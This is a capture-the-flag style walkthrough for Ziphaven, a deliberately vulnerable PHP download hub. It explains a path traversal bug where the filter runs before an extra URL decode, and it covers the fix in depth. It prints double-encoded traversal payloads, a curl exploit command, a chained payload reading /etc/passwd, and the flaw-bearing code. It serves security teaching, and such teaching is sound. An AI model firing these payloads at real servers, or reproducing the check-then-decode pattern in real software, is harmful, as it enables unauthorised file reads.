# Ziphaven: Solution / Walkthrough

![CWE-22](https://img.shields.io/badge/CWE--22-Path%20Traversal-red?style=flat-square)
![PHP](https://img.shields.io/badge/PHP-Apache-777BB4?style=flat-square&logo=php&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**Ziphaven is an intentionally vulnerable application built for security education.** It is a small release & download hub with a deliberate [path traversal](https://owasp.org/www-community/attacks/Path_Traversal)
(CWE-22) flaw — hidden behind a filter that inspects the filename _before_ decoding it — so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the payload and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* path traversal is and *how* to
approach the lab. This page is the spoiler half: the confirmed exploit, the
flag, and — most importantly — the **why** behind the bug and its fix. By the
end you should be able to:

- Read a snippet of file-serving code and point to the exact vulnerable line.
- Explain why validating *before* decoding is the same as not validating.
- Explain **why** each fix works — and why some "obvious" fixes don't.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): path traversal
> happens when an app builds a file path from user input and trusts it to stay
> inside the intended folder. Ziphaven checks for `../` *before* an extra
> decode, so an encoded `../` slips past and is rebuilt afterwards.

If you only want the payload, jump to [Exploitation](#-exploitation) — but the
real value is in the *why*.

<br>

## 🐛 The vulnerability

The `src/Download.php` guards the request like this:

```php
public static function resolve(string $downloadsDir, string $requested): string
{
    // The guard (runs too early): reject a literal "../" or "..\".
    if (str_contains($requested, '../') || str_contains($requested, '..\\')) {
        throw new \RuntimeException('Rejected: path traversal detected.');
    }

    // The fatal "extra" decode — AFTER the check.
    $decoded = urldecode($requested);

    return $downloadsDir . \DIRECTORY_SEPARATOR . $decoded;
}
```

Walk through it the way the computer does, keeping in mind there are **two
decode layers** in play:

1. The browser/attacker sends `?file=%252e%252e%252fflag.txt` (double-encoded).
2. The **webserver / PHP decodes the query string once** before your code runs,
   so `$requested` is already `%2e%2e%2fflag.txt` — *still encoded* one layer.
3. The guard runs `str_contains($requested, '../')`. It sees `%2e%2e%2f`, **not**
   a literal `../` — so it **passes**.
4. Only *now* does the code call `urldecode($requested)` "one more time",
   turning `%2e%2e%2f` into `../`. The traversal is reborn *after* the check.
5. The decoded path is concatenated and opened — outside `downloads/`.

The mistake is **order of operations**. The guard inspects a form of the input
that the app will later change. Validating before the final decode means the
check never saw the real value.

> **Why does this look safe?** Because the code *does* reject `../`, and a quick
> test with a plain payload confirms it. The bug hides in the gap between "what
> the filter inspected" and "what the app finally used."

<br>

## 💥 Exploitation

**The intended request** — what the app expects:

```
GET /download.php?file=ziphaven-sdk-2.9.0.zip
```

Serves the SDK. Working as designed.

**A plain `../` is rejected** by the guard:

```
GET /download.php?file=../flag.txt         -> 400 (literal ../ detected)
```

**The exploit** — double-encode the traversal so the guard sees `%2e%2e%2f` and
the app's extra `urldecode()` rebuilds `../`:

```
GET /download.php?file=%252e%252e%252fflag.txt
```

With `curl` (send the double-encoded value literally — don't let the client
decode it):

```bash
curl --path-as-is "http://localhost:8100/download.php?file=%252e%252e%252fflag.txt"
```

> **Why double-encoded?** The webserver peels one layer (`%252e` → `%2e`) before
> your payload reaches the guard, so the guard sees `%2e%2e%2f` (no literal
> `../`). The app's own `urldecode()` then peels the second layer into `../`.
> You need exactly one more encoding layer than the number of decodes before the
> check.

Expected output:

```
FLAG{ZIPHAVEN_UNZIPPED}
```

> A single-encoded slash form also works (`..%252fflag.txt` / `..%2fflag.txt`
> depending on where you count the decodes) — anything that keeps the literal
> `../` hidden from the guard but alive for the extra decode.

> **Where does the flag come from?** It is **not** in the repo — it is baked into
> the Docker image at build time at `/app/flag.txt`, one level above
> `downloads/` (see the `Dockerfile`).

<br>

## 🚀 Going further

Chain encoded segments to climb further and read files elsewhere on the
container filesystem:

```
GET /download.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

> Inside the hardened container this reads the *container's* `/etc/passwd`, not
> your host's, and the app runs as a non-root user — the blast radius is
> deliberately small.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and load <http://localhost:8100>.
2. Click **Download** on any artefact and capture the request in **Proxy > HTTP
   history**. Send it to **Repeater** and re-send for a **baseline**.
3. Try `file=../flag.txt` — blocked (400). A filter exists and reads the raw
   string.
4. Build the encoded payload: select `../` and URL-encode with **Ctrl+U** to get
   `%2e%2e%2f`, then encode the result **again** (encode the `%` too) to get
   `%252e%252e%252f`. Burp's **Decoder** is handy for building it step by step.
5. Send it as-is and watch the flag come back.

> If a payload fails because Burp re-encoded or normalised it, inspect the raw
> request — getting the *exact* number of encoding layers right is the whole
> game here.

<br>

## 🛡️ The fix

Never inspect input *before* fully decoding it, and never rely on a blocklist.
**Decode once, up front**, then **resolve and contain**:

```php
$decoded = rawurldecode($requested);           // decode fully, BEFORE validating
$base = realpath($downloadsDir);
$full = realpath($downloadsDir . '/' . $decoded);

if ($full === false || !str_starts_with($full, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(403);
    return;
}
// safe to read $full
```

Why this works: you validate the value in its **final** form, so no later decode
can reintroduce a `../`; and `realpath` + the prefix check confine the result to
`downloads/` regardless of how it was encoded.

### ⚠️ Tempting fixes that *don't* work

These are the traps specific to an encoding/ordering design:

- **Decoding *once* and then checking.** This is the bug itself (just shifted by
  one layer). An attacker adds another encoding layer. Decode *fully* (loop
  until the value stops changing) — or better, resolve and contain.
- **Adding more literal patterns to the blocklist** (`..\`, `%2e`, `%252e`, …).
  A blocklist arms race you lose — this is the same dead end you saw stripping
  `../` in **[deskmint (Level 3)](https://github.com/iv0ks/deskmint)**.
- **Trusting the webserver already decoded "enough".** You can't assume how many
  layers sit between the client and your code; validate the canonical path, not
  a guess about decode count.

> Series thread: **[medialoft (Level 4)](https://github.com/iv0ks/medialoft)**
> checked the wrong *property*; Ziphaven checks the right thing at the wrong
> *time*. Next, **[brewdocs (Level 6)](https://github.com/iv0ks/brewdocs)**
> checks the right thing on an un-normalised string.

### ✅ Even better: don't build paths from user input at all

- **Opaque IDs.** Serve artefacts by a server-side ID mapped to a real path.
- **Allow-list.** Accept only the release filenames you actually publish.
- **Use a vetted helper.** Lean on a framework's safe file-serving helper rather
  than hand-rolling decode + path logic.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **Decode first, validate second.** Checking a value you'll later transform is
   the same as not checking it.
2. **Count the decode layers.** The webserver decodes once; extra app-side
   decodes stack. Payloads need one more layer than the decodes before the check.
3. **Resolve, then check.** Canonicalise with `realpath()` *after* a full decode,
   and fail closed if the result escapes the base directory.
4. **Blocklists still lose.** Adding `%2e`/`%252e` patterns is an arms race, not
   a fix.
5. **Defence in depth matters.** Non-root + container didn't *fix* the bug, but
   it kept the blast radius small.

That's Level 5 — the right check at the wrong time. Head back to the
**[Learning Guide](GUIDE.md)** for the method, or the **[README](README.md)** for
the lab setup.
